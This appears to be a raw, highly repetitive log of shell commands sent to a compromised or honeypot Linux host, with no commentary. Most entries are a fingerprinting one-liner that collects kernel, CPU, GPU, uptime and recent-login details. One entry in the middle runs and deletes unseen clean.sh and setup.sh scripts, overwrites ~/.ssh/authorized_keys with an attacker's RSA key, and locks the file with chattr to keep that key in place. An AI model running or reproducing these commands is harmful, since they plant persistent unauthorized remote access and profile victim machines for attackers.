awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
